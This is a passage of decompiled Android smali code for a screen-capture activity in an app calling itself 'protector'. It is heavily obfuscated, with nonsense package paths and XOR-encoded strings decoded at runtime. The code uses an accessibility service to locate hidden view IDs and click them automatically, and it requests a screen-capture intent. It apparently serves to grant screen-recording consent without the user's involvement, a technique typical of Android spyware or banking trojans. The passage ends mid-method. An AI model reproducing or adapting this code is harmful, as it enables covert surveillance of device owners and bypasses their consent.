.class public Lcom/icontrol/protector/ActivityCaptureScreen;
.super Landroid/app/Activity;
.source "SourceFile"


# static fields
.field private static b:I = 0x50

.field public static c:Z

.field public static d:Z


# direct methods
.method static constructor <clinit>()V
    .locals 4

    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x22

    const/4 v2, 0x1

    const/4 v3, 0x0

    if-lt v0, v1, :cond_0

    move v1, v2

    goto :goto_0

    :cond_0
    move v1, v3

    :goto_0
    sput-boolean v1, Lcom/icontrol/protector/ActivityCaptureScreen;->c:Z

    const/16 v1, 0x23

    if-lt v0, v1, :cond_1

    goto :goto_1

    :cond_1
    move v2, v3

    :goto_1
    sput-boolean v2, Lcom/icontrol/protector/ActivityCaptureScreen;->d:Z

    return-void
.end method

.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    return-void
.end method

.method private a()V
    .locals 1

    .line 1
    invoke-static {p0}, Lcom/icontrol/protector/ScreenCaps;->t(Landroid/content/Context;)Landroid/content/Intent;

    move-result-object v0

    invoke-virtual {p0, v0}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    return-void
.end method

.method private static b(Landroid/view/accessibility/AccessibilityNodeInfo;)V
    .locals 12

    .line 1
    invoke-static {}, Lcom/icontrol/protector/ActivityCaptureScreen;->e()Landroid/content/Context;

    move-result-object v0

    sget-boolean v1, Lcom/icontrol/protector/ActivityCaptureScreen;->c:Z

    const-wide/16 v2, 0xc8

    const/16 v4, 0x31

    const-wide/16 v5, 0x320

    const/4 v7, 0x1

    const/16 v8, 0x10

    const/4 v9, 0x0

    const/16 v10, 0x8

    if-eqz v1, :cond_1

    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ev;->a()I

    move-result v1

    const/4 v11, 0x2

    if-ne v1, v11, :cond_1

    new-array v1, v4, [B

    fill-array-data v1, :array_0

    new-array v4, v10, [B

    fill-array-data v4, :array_1

    invoke-static {v1, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Lcom/icontrol/protector/m;->f3(Ljava/lang/String;)Ljava/util/List;

    move-result-object v1

    if-eqz v1, :cond_0

    invoke-interface {v1}, Ljava/util/List;->isEmpty()Z

    move-result v4

    if-nez v4, :cond_0

    invoke-interface {v1, v9}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v4

    if-eqz v4, :cond_0

    new-instance v4, Landroid/graphics/Rect;

    invoke-direct {v4}, Landroid/graphics/Rect;-><init>()V

    invoke-interface {v1, v9}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v9

    check-cast v9, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v9, v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->getBoundsInScreen(Landroid/graphics/Rect;)V

    invoke-virtual {v4}, Landroid/graphics/Rect;->centerX()I

    move-result v9

    invoke-virtual {v4}, Landroid/graphics/Rect;->centerY()I

    move-result v4

    invoke-static {v9, v4}, Lcom/icontrol/protector/a;->z(II)Z

    invoke-static {v2, v3}, Ljava/lang/Thread;->sleep(J)V

    new-array v2, v8, [B

    fill-array-data v2, :array_2

    new-array v3, v10, [B

    fill-array-data v3, :array_3

    invoke-static {v2, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Lcom/icontrol/protector/m;->f3(Ljava/lang/String;)Ljava/util/List;

    move-result-object v2

    invoke-interface {v1}, Ljava/util/List;->isEmpty()Z

    move-result v1

    if-nez v1, :cond_0

    :goto_0
    invoke-interface {v2, v7}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v1

    :goto_1
    check-cast v1, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    invoke-virtual {v1, v8}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    :cond_0
    invoke-static {v5, v6}, Ljava/lang/Thread;->sleep(J)V

    invoke-static {p0, v0}, Lcom/icontrol/protector/ActivityCaptureScreen;->c(Landroid/view/accessibility/AccessibilityNodeInfo;Landroid/content/Context;)V

    return-void

    :cond_1
    sget-boolean v1, Lcom/icontrol/protector/ActivityCaptureScreen;->d:Z

    if-eqz v1, :cond_2

    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ev;->a()I

    move-result v1

    const/4 v11, 0x3

    if-ne v1, v11, :cond_2

    new-array v1, v4, [B

    fill-array-data v1, :array_4

    new-array v4, v10, [B

    fill-array-data v4, :array_5

    invoke-static {v1, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Lcom/icontrol/protector/m;->f3(Ljava/lang/String;)Ljava/util/List;

    move-result-object v1

    if-eqz v1, :cond_0

    invoke-interface {v1}, Ljava/util/List;->isEmpty()Z

    move-result v4

    if-nez v4, :cond_0

    invoke-interface {v1, v9}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v4

    if-eqz v4, :cond_0

    new-instance v4, Landroid/graphics/Rect;

    invoke-direct {v4}, Landroid/graphics/Rect;-><init>()V

    invoke-interface {v1, v9}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v9

    check-cast v9, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v9, v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->getBoundsInScreen(Landroid/graphics/Rect;)V

    invoke-virtual {v4}, Landroid/graphics/Rect;->centerX()I

    move-result v9

    invoke-virtual {v4}, Landroid/graphics/Rect;->centerY()I

    move-result v4

    invoke-static {v9, v4}, Lcom/icontrol/protector/a;->z(II)Z

    invoke-static {v2, v3}, Ljava/lang/Thread;->sleep(J)V

    new-array v2, v8, [B

    fill-array-data v2, :array_6

    new-array v3, v10, [B

    fill-array-data v3, :array_7

    invoke-static {v2, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Lcom/icontrol/protector/m;->f3(Ljava/lang/String;)Ljava/util/List;

    move-result-object v2

    invoke-interface {v1}, Ljava/util/List;->isEmpty()Z

    move-result v1

    if-nez v1, :cond_0

    goto :goto_0

    :cond_2
    sget-boolean v1, Lcom/icontrol/protector/ActivityCaptureScreen;->d:Z

    if-eqz v1, :cond_3

    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ev;->a()I

    move-result v1

    const/4 v11, 0x4

    if-ne v1, v11, :cond_3

    new-array v1, v4, [B

    fill-array-data v1, :array_8

    new-array v4, v10, [B

    fill-array-data v4, :array_9

    invoke-static {v1, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Lcom/icontrol/protector/m;->f3(Ljava/lang/String;)Ljava/util/List;

    move-result-object v1

    if-eqz v1, :cond_0

    invoke-interface {v1}, Ljava/util/List;->isEmpty()Z

    move-result v4

    if-nez v4, :cond_0

    invoke-interface {v1, v9}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v4

    if-eqz v4, :cond_0

    new-instance v4, Landroid/graphics/Rect;

    invoke-direct {v4}, Landroid/graphics/Rect;-><init>()V

    invoke-interface {v1, v9}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v9

    check-cast v9, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v9, v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->getBoundsInScreen(Landroid/graphics/Rect;)V

    invoke-virtual {v4}, Landroid/graphics/Rect;->centerX()I

    move-result v9

    invoke-virtual {v4}, Landroid/graphics/Rect;->centerY()I

    move-result v4

    invoke-static {v9, v4}, Lcom/icontrol/protector/a;->z(II)Z

    invoke-static {v2, v3}, Ljava/lang/Thread;->sleep(J)V

    const/16 v2, 0x24

    new-array v2, v2, [B

    fill-array-data v2, :array_a

    new-array v3, v10, [B

    fill-array-data v3, :array_b

    invoke-static {v2, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Lcom/icontrol/protector/m;->f3(Ljava/lang/String;)Ljava/util/List;

    move-result-object v2

    invoke-interface {v1}, Ljava/util/List;->isEmpty()Z

    move-result v1

    if-nez v1, :cond_0

    goto/16 :goto_0

    :cond_3
    sget-boolean v1, Lcom/icontrol/protector/ActivityCaptureScreen;->d:Z

    if-eqz v1, :cond_4

    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ev;->a()I

    move-result v1

    const/4 v11, 0x6

    if-ne v1, v11, :cond_4

    new-array v1, v4, [B

    fill-array-data v1, :array_c

    new-array v4, v10, [B

    fill-array-data v4, :array_d

    invoke-static {v1, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Lcom/icontrol/protector/m;->f3(Ljava/lang/String;)Ljava/util/List;

    move-result-object v1

    if-eqz v1, :cond_0

    invoke-interface {v1}, Ljava/util/List;->isEmpty()Z

    move-result v4

    if-nez v4, :cond_0

    invoke-interface {v1, v9}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v4

    if-eqz v4, :cond_0

    new-instance v4, Landroid/graphics/Rect;

    invoke-direct {v4}, Landroid/graphics/Rect;-><init>()V

    invoke-interface {v1, v9}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v9

    check-cast v9, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v9, v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->getBoundsInScreen(Landroid/graphics/Rect;)V

    invoke-virtual {v4}, Landroid/graphics/Rect;->centerX()I

    move-result v9

    invoke-virtual {v4}, Landroid/graphics/Rect;->centerY()I

    move-result v4

    invoke-static {v9, v4}, Lcom/icontrol/protector/a;->z(II)Z

    invoke-static {v2, v3}, Ljava/lang/Thread;->sleep(J)V

    new-array v2, v8, [B

    fill-array-data v2, :array_e

    new-array v3, v10, [B

    fill-array-data v3, :array_f

    invoke-static {v2, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Lcom/icontrol/protector/m;->f3(Ljava/lang/String;)Ljava/util/List;

    move-result-object v2

    invoke-interface {v1}, Ljava/util/List;->isEmpty()Z

    move-result v1

    if-nez v1, :cond_0

    goto/16 :goto_0

    :cond_4
    sget-boolean v1, Lcom/icontrol/protector/ActivityCaptureScreen;->d:Z

    if-eqz v1, :cond_5

    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ev;->a()I

    move-result v1

    const/16 v11, 0xe

    if-ne v1, v11, :cond_5

    const/16 v1, 0x1f

    new-array v1, v1, [B

    fill-array-data v1, :array_10

    new-array v2, v10, [B

    fill-array-data v2, :array_11

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Lcom/icontrol/protector/m;->f3(Ljava/lang/String;)Ljava/util/List;

    move-result-object v1

    if-eqz v1, :cond_0

    invoke-interface {v1}, Ljava/util/List;->isEmpty()Z

    move-result v2

    if-nez v2, :cond_0

    invoke-interface {v1, v7}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v1

    goto/16 :goto_1

    :cond_5
    sget-boolean v1, Lcom/icontrol/protector/ActivityCaptureScreen;->d:Z

    if-eqz v1, :cond_6

    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ev;->a()I

    move-result v1

    const/16 v11, 0xf

    if-ne v1, v11, :cond_6

    new-array v1, v4, [B

    fill-array-data v1, :array_12

    new-array v4, v10, [B

    fill-array-data v4, :array_13

    invoke-static {v1, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Lcom/icontrol/protector/m;->f3(Ljava/lang/String;)Ljava/util/List;

    move-result-object v1

    if-eqz v1, :cond_0

    invoke-interface {v1}, Ljava/util/List;->isEmpty()Z

    move-result v4

    if-nez v4, :cond_0

    invoke-interface {v1, v9}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v4

    if-eqz v4, :cond_0

    new-instance v4, Landroid/graphics/Rect;

    invoke-direct {v4}, Landroid/graphics/Rect;-><init>()V

    invoke-interface {v1, v9}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v9

    check-cast v9, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v9, v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->getBoundsInScreen(Landroid/graphics/Rect;)V

    invoke-virtual {v4}, Landroid/graphics/Rect;->centerX()I

    move-result v9

    invoke-virtual {v4}, Landroid/graphics/Rect;->centerY()I

    move-result v4

    invoke-static {v9, v4}, Lcom/icontrol/protector/a;->z(II)Z

    invoke-static {v2, v3}, Ljava/lang/Thread;->sleep(J)V

    new-array v2, v8, [B

    fill-array-data v2, :array_14

    new-array v3, v10, [B

    fill-array-data v3, :array_15

    invoke-static {v2, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Lcom/icontrol/protector/m;->f3(Ljava/lang/String;)Ljava/util/List;

    move-result-object v2

    invoke-interface {v1}, Ljava/util/List;->isEmpty()Z

    move-result v1

    if-nez v1, :cond_0

    goto/16 :goto_0

    :cond_6
    invoke-static {p0, v0}, Lcom/icontrol/protector/ActivityCaptureScreen;->c(Landroid/view/accessibility/AccessibilityNodeInfo;Landroid/content/Context;)V

    return-void

    nop

    :array_0
    .array-data 1
        -0x4dt
        0x8t
        0x2ct
        0x4dt
        0x5dt
        0xft
        0x7et
        -0x20t
        -0x41t
        0xet
        0x25t
        0x4dt
        0x4ft
        0x18t
        0x69t
        -0x1at
        -0x4bt
        0xat
        0x34t
        0xat
        0x6t
        0x8t
        0x7et
        -0x43t
        -0x5dt
        0x4t
        0x33t
        0x6t
        0x59t
        0xft
        0x45t
        -0x1ft
        -0x48t
        0x6t
        0x33t
        0x6t
        0x63t
        0xct
        0x75t
        -0xat
        -0x4bt
        0x38t
        0x32t
        0x13t
        0x55t
        0xft
        0x74t
        -0x9t
        -0x5et
    .end array-data

    nop

    :array_1
    .array-data 1
        -0x30t
        0x67t
        0x41t
        0x63t
        0x3ct
        0x61t
        0x1at
        -0x6et
    .end array-data

    :array_2
    .array-data 1
        -0x2at
        -0x2bt
        -0x73t
        -0x54t
        -0x5at
        -0x61t
        0x5bt
        0x15t
        -0x22t
        -0x21t
        -0x3at
        -0x56t
        -0x54t
        -0x72t
        0x4bt
        0x1et
    .end array-data

    :array_3
    .array-data 1
        -0x49t
        -0x45t
        -0x17t
        -0x22t
        -0x37t
        -0xat
        0x3ft
        0x2ft
    .end array-data

    :array_4
    .array-data 1
        0x78t
        0x1bt
        0x64t
        -0x80t
        0x79t
        -0x50t
        -0x1ct
        -0x4ct
        0x74t
        0x1dt
        0x6dt
        -0x80t
        0x6bt
        -0x59t
        -0xdt
        -0x4et
        0x7et
        0x19t
        0x7ct
        -0x39t
        0x22t
        -0x49t
        -0x1ct
        -0x17t
        0x68t
        0x17t
        0x7bt
        -0x35t
        0x7dt
        -0x50t
        -0x21t
        -0x4bt
        0x73t
        0x15t
        0x7bt
        -0x35t
        0x47t
        -0x4dt
        -0x11t
        -0x5et
        0x7et
        0x2bt
        0x7at
        -0x22t
        0x71t
        -0x50t
        -0x12t
        -0x5dt
        0x69t
    .end array-data

    nop

    :array_5
    .array-data 1
        0x1bt
        0x74t
        0x9t
        -0x52t
        0x18t
        -0x22t
        -0x80t
        -0x3at
    .end array-data

    :array_6
    .array-data 1
        0x4bt
        -0x1ct
        0x4ct
        -0x6bt
        0x6dt
        -0x51t
        0xdt
        -0x7t
        0x43t
        -0x12t
        0x7t
        -0x6dt
        0x67t
        -0x42t
        0x1dt
        -0xet
    .end array-data

    :array_7
    .array-data 1
        0x2at
        -0x76t
        0x28t
        -0x19t
        0x2t
        -0x3at
        0x69t
        -0x3dt
    .end array-data

    :array_8
    .array-data 1
        0x66t
        -0x39t
        0xdt
        0x7et
        -0x5ct
        0x7dt
        -0x11t
        -0x2ft
        0x6at
        -0x3ft
        0x4t
        0x7et
        -0x4at
        0x6at
        -0x8t
        -0x29t
        0x60t
        -0x3bt
        0x15t
        0x39t
        -0x1t
        0x7at
        -0x11t
        -0x74t
        0x76t
        -0x35t
        0x12t
        0x35t
        -0x60t
        0x7dt
        -0x2ct
        -0x30t
        0x6dt
        -0x37t
        0x12t
        0x35t
        -0x66t
        0x7et
        -0x1ct
        -0x39t
        0x60t
        -0x9t
        0x13t
        0x20t
        -0x54t
        0x7dt
        -0x1bt
        -0x3at
        0x77t
    .end array-data

    nop

    :array_9
    .array-data 1
        0x5t
        -0x58t
        0x60t
        0x50t
        -0x3bt
        0x13t
        -0x75t
        -0x5dt
    .end array-data

    :array_a
    .array-data 1
        -0x45t
        0x1at
        0x26t
        -0x4ft
        0x26t
        -0x23t
        -0xat
        -0x3et
        -0x49t
        0x1ct
        0x2ft
        -0x4ft
        0x34t
        -0x36t
        -0x1ft
        -0x3ct
        -0x43t
        0x18t
        0x3et
        -0xat
        0x7dt
        -0x26t
        -0xat
        -0x61t
        -0x4bt
        0x10t
        0x25t
        -0x16t
        0x18t
        -0x30t
        -0x3t
        -0x22t
        -0x54t
        0x10t
        0x25t
        -0x15t
    .end array-data

    :array_b
    .array-data 1
        -0x28t
        0x75t
        0x4bt
        -0x61t
        0x47t
        -0x4dt
        -0x6et
        -0x50t
    .end array-data

    :array_c
    .array-data 1
        0x0t
        0x38t
        -0x7ft
        0x4ct
        -0x3ft
        0x71t
        -0x1bt
        -0x5at
        0xct
        0x3et
        -0x78t
        0x4ct
        -0x2dt
        0x66t
        -0xet
        -0x60t
        0x6t
        0x3at
        -0x67t
        0xbt
        -0x66t
        0x76t
        -0x1bt
        -0x5t
        0x10t
        0x34t
        -0x62t
        0x7t
        -0x3bt
        0x71t
        -0x22t
        -0x59t
        0xbt
        0x36t
        -0x62t
        0x7t
        -0x1t
        0x72t
        -0x12t
        -0x50t
        0x6t
        0x8t
        -0x61t
        0x12t
        -0x37t
        0x71t
        -0x11t
        -0x4ft
        0x11t
    .end array-data

    nop

    :array_d
    .array-data 1
        0x63t
        0x57t
        -0x14t
        0x62t
        -0x60t
        0x1ft
        -0x7ft
        -0x2ct
    .end array-data

    :array_e
    .array-data 1
        0x25t
        -0x2t
        -0x7at
        0x57t
        0x4dt
        0x44t
        0x16t
        0xet
        0x2dt
        -0xct
        -0x33t
        0x51t
        0x47t
        0x55t
        0x6t
        0x5t
    .end array-data

    :array_f
    .array-data 1
        0x44t
        -0x70t
        -0x1et
        0x25t
        0x22t
        0x2dt
        0x72t
        0x34t
    .end array-data

    :array_10
    .array-data 1
        -0x30t
        0x76t
        -0x77t
        0x7at
        0x40t
        0x6dt
        0x61t
        0x75t
        -0x24t
        0x70t
        -0x80t
        0x7at
        0x52t
        0x7at
        0x76t
        0x73t
        -0x2at
        0x74t
        -0x6ft
        0x3dt
        0x1bt
        0x6at
        0x61t
        0x28t
        -0x25t
        0x6et
        -0x6at
        0x35t
        0x45t
        0x6at
        0x6at
    .end array-data

    :array_11
    .array-data 1
        -0x4dt
        0x19t
        -0x1ct
        0x54t
        0x21t
        0x3t
        0x5t
        0x7t
    .end array-data

    :array_12
    .array-data 1
        -0x4dt
        -0x50t
        -0x6t
        -0x5et
        0x32t
        0x60t
        0x6bt
        -0x77t
        -0x41t
        -0x4at
        -0xdt
        -0x5et
        0x20t
        0x77t
        0x7ct
        -0x71t
        -0x4bt
        -0x4et
        -0x1et
        -0x1bt
        0x69t
        0x67t
        0x6bt
        -0x2ct
        -0x5dt
        -0x44t
        -0x1bt
        -0x17t
        0x36t
        0x60t
        0x50t
        -0x78t
        -0x48t
        -0x42t
        -0x1bt
        -0x17t
        0xct
        0x63t
        0x60t
        -0x61t
        -0x4bt
        -0x80t
        -0x1ct
        -0x4t
        0x3at
        0x60t
        0x61t
        -0x62t
        -0x5et
    .end array-data

    nop

    :array_13
    .array-data 1
        -0x30t
        -0x21t
        -0x69t
        -0x74t
        0x53t
        0xet
        0xft
        -0x5t
    .end array-data

    :array_14
    .array-data 1
        -0x2at
        0x2ft
        0x39t
        0xft
        0x64t
        0x16t
        0x7at
        0x12t
        -0x22t
        0x25t
        0x72t
        0x9t
        0x6et
        0x7t
        0x6at
        0x19t
    .end array-data

    :array_15
    .array-data 1
        -0x49t
        0x41t
        0x5dt
        0x7dt
        0xbt
        0x7ft
        0x1et
        0x28t
    .end array-data
.end method

.method private static c(Landroid/view/accessibility/AccessibilityNodeInfo;Landroid/content/Context;)V
    .locals 4

    .line 1
    const/16 p1, 0x12

    new-array p1, p1, [B

    fill-array-data p1, :array_0

    const/16 v0, 0x8

    new-array v1, v0, [B

    fill-array-data v1, :array_1

    invoke-static {p1, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p1

    const/16 v1, 0x4b

    new-array v1, v1, [B

    fill-array-data v1, :array_2

    new-array v2, v0, [B

    fill-array-data v2, :array_3

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    const/16 v2, 0x3b

    new-array v2, v2, [B

    fill-array-data v2, :array_4

    new-array v0, v0, [B

    fill-array-data v0, :array_5

    invoke-static {v2, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    filled-new-array {p1, v1, v0}, [Ljava/lang/String;

    move-result-object p1

    const/4 v0, 0x0

    :goto_0
    const/4 v1, 0x3

    if-ge v0, v1, :cond_1

    aget-object v1, p1, v0

    invoke-virtual {p0, v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v1

    invoke-interface {v1}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v1

    :goto_1
    invoke-interface {v1}, Ljava/util/Iterator;->hasNext()Z

    move-result v2

    if-eqz v2, :cond_0

    invoke-interface {v1}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Landroid/view/accessibility/AccessibilityNodeInfo;

    const/16 v3, 0x10

    invoke-virtual {v2, v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    goto :goto_1

    :cond_0
    add-int/lit8 v0, v0, 0x1

    goto :goto_0

    :cond_1
    return-void

    :array_0
    .array-data 1
        0x5ft
        0x14t
        -0x4bt
        0x6at
        -0x58t
        0x13t
        -0x4ft
        -0x2t
        0x57t
        0x1et
        -0x2t
        0x7at
        -0x4et
        0xet
        -0x5ft
        -0x55t
        0x50t
        0x4bt
    .end array-data

    nop

    :array_1
    .array-data 1
        0x3et
        0x7at
        -0x2ft
        0x18t
        -0x39t
        0x7at
        -0x2bt
        -0x3ct
    .end array-data

    :array_2
    .array-data 1
        0x29t
        0x25t
        -0x5dt
        0x4dt
        0x7et
        -0x5ct
        0x54t
        0x5ft
        0x25t
        0x23t
        -0x56t
        0x4dt
        0x6ft
        -0x51t
        0x42t
        0x40t
        0x23t
        0x39t
        -0x43t
        0xat
        0x70t
        -0x5ct
        0x53t
        0x42t
        0x24t
        0x3et
        -0x44t
        0xct
        0x73t
        -0x5at
        0x55t
        0x5ft
        0x70t
        0x23t
        -0x56t
        0x4ct
        0x6ft
        -0x51t
        0x42t
        0x40t
        0x23t
        0x39t
        -0x43t
        0xat
        0x70t
        -0x5ct
        0x6ft
        0x4ct
        0x26t
        0x26t
        -0x5ft
        0x14t
        0x40t
        -0x54t
        0x5ft
        0x5ft
        0x2ft
        0x2dt
        -0x44t
        0xct
        0x6at
        -0x5ct
        0x54t
        0x72t
        0x25t
        0x24t
        -0x5et
        0x1at
        0x40t
        -0x58t
        0x45t
        0x59t
        0x3et
        0x25t
        -0x60t
    .end array-data

    :array_3
    .array-data 1
        0x4at
        0x4at
        -0x32t
        0x63t
        0x1ft
        -0x36t
        0x30t
        0x2dt
    .end array-data

    :array_4
    .array-data 1
        0x5ct
        -0x25t
        -0x4ct
        0x34t
        0x41t
        0x28t
        0x37t
        0x19t
        0x50t
        -0x23t
        -0x43t
        0x34t
        0x50t
        0x23t
        0x21t
        0x6t
        0x56t
        -0x39t
        -0x56t
        0x73t
        0x4ft
        0x28t
        0x30t
        0x4t
        0x51t
        -0x40t
        -0x55t
        0x75t
        0x4ct
        0x2at
        0x36t
        0x19t
        0x5t
        -0x23t
        -0x43t
        0x35t
        0x50t
        0x23t
        0x21t
        0x6t
        0x56t
        -0x39t
        -0x56t
        0x73t
        0x4ft
        0x28t
        0xct
        0xat
        0x53t
        -0x28t
        -0x4at
        0x6dt
        0x7ft
        0x24t
        0x26t
        0x1ft
        0x4bt
        -0x25t
        -0x49t
    .end array-data

    :array_5
    .array-data 1
        0x3ft
        -0x4ct
        -0x27t
        0x1at
        0x20t
        0x46t
        0x53t
        0x6bt
    .end array-data
.end method

.method public static d()Lcom/icontrol/protector/AccessServices;
    .locals 1

    .line 1
    sget-object v0, Lcom/icontrol/protector/WorkServices;->j:Lcom/icontrol/protector/AccessServices;

    if-nez v0, :cond_0

    const/4 v0, 0x0

    :cond_0
    return-object v0
.end method

.method private static e()Landroid/content/Context;
    .locals 1

    .line 1
    sget-object v0, Lcom/icontrol/protector/WorkServices;->j:Lcom/icontrol/protector/AccessServices;

    if-nez v0, :cond_0

    const/4 v0, 0x0

    return-object v0

    :cond_0
    invoke-virtual {v0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    return-object v0
.end method

.method private f()V
    .locals 2

    .line 1
    const/16 v0, 0x10

    new-array v0, v0, [B

    fill-array-data v0, :array_0

    const/16 v1, 0x8

    new-array v1, v1, [B

    fill-array-data v1, :array_1

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/media/projection/MediaProjectionManager;

    invoke-virtual {v0}, Landroid/media/projection/MediaProjectionManager;->createScreenCaptureIntent()Landroid/content/Intent;

    move-result-object v0

    const/16 v1, 0x64

